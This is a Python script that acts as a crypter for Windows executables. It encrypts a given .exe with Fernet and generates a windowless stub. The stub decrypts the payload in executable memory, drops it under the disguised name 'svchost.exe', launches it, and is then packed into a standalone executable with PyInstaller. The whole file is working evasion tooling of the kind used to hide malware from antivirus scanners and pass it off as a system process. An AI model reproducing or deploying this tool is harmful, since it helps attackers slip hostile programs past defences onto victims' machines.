from cryptography.fernet import Fernet
import subprocess
import os
import shutil
import sys

input_file = sys.argv[1]
input_filename_w_extention = os.path.basename(input_file)
# remove the .exe extension
input_filename = input_filename_w_extention[:-4]
output_filename = input_filename
output_path = os.getcwd()

# Encrypt the software
key = Fernet.generate_key()
cipher = Fernet(key)
with open(input_file, "rb") as f:
    encrypted_data = cipher.encrypt(f.read())

# decryptor code
decryptor_code = f"""
from cryptography.fernet import Fernet
import ctypes
from ctypes import *
import win32api
from ctypes.wintypes import *
from ctypes.wintypes import HANDLE, DWORD


key = {key!r}
cipher = Fernet(key)

encrypted_data = {encrypted_data}

# Decrypt the content
decrypted_data = cipher.decrypt(encrypted_data)

# Set the argument and return types for VirtualAlloc
ctypes.windll.kernel32.VirtualAlloc.argtypes = [
    ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint32, ctypes.c_uint32
]
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p

# Allocate memory for the binary data
size = len(decrypted_data)
ptr = ctypes.windll.kernel32.VirtualAlloc(None, size, 0x3000, 0x40)
if not ptr:
    raise Exception("Failed to allocate memory")

# Write the binary data to memory
ctypes.memmove(ptr, decrypted_data, size)

# Create a file in memory
filename = ctypes.c_wchar_p("svchost.exe")
access = ctypes.c_uint32(0x10000000)  # GENERIC_READ | GENERIC_WRITE
mode = ctypes.c_uint32(0x00000002)  # CREATE_ALWAYS
handle = ctypes.windll.kernel32.CreateFileW(filename, access, 0, None, mode, 0, None)
if handle == -1:
    raise Exception("Failed to create file")

# Write the binary data to the file
num_bytes_written = ctypes.c_uint32()
result = ctypes.windll.kernel32.WriteFile(handle, ctypes.c_void_p(ptr), size, ctypes.byref(num_bytes_written), None)
if result == 0:
    raise Exception("Failed to write data to file")

# Close the file handle
ctypes.windll.kernel32.CloseHandle(handle)

# Create a process to run the file
class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ('hProcess', HANDLE), 
        ('hThread', HANDLE), 
        ('dwProcessId', DWORD), 
        ('dwThreadId', DWORD),
    ]
    
class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ('cb', DWORD), 
        ('lpReserved', LPSTR),    
        ('lpDesktop', LPSTR),
        ('lpTitle', LPSTR),
        ('dwX', DWORD),
        ('dwY', DWORD),
        ('dwXSize', DWORD),
        ('dwYSize', DWORD),
        ('dwXCountChars', DWORD),
        ('dwYCountChars', DWORD),
        ('dwFillAttribute', DWORD),
        ('dwFlags', DWORD),
        ('wShowWindow', WORD),
        ('cbReserved2', WORD),
        ('lpReserved2', DWORD),    
        ('hStdInput', HANDLE),
        ('hStdOutput', HANDLE),
        ('hStdError', HANDLE),
    ]

# Create a process to run the file
startup_info = STARTUPINFO()
startup_info.cb = ctypes.sizeof(startup_info)
process_info = PROCESS_INFORMATION()
result = ctypes.windll.kernel32.CreateProcessW(filename, None, None, None, False, 0, None, None, ctypes.byref(startup_info), ctypes.byref(process_info))
if result == 0:
    raise Exception("Failed to create process")

# Wait for the process to complete
ctypes.windll.kernel32.WaitForSingleObject(process_info.hProcess, -1)

# Free memory
ctypes.windll.kernel32.VirtualFree(ctypes.c_void_p(ptr), 0, 0x8000)
"""

decryptor_script_path = f"{output_path}\RT_GEN_{output_filename}.pyw"

with open(decryptor_script_path, "w") as f:
    f.write(decryptor_code)

# Compile the decryptor code into an executable
subprocess.call(["pyinstaller", "--onefile", decryptor_script_path])

# Remove unnecessary files/folders generated by pyinstaller
os.remove(f'RT_GEN_{input_filename}.spec')
shutil.rmtree('build')
shutil.move(f'{output_path}\dist\RT_GEN_{input_filename}.exe', f'{output_path}\RT_GEN_{output_filename}.exe')
shutil.rmtree('dist')
os.remove(decryptor_script_path)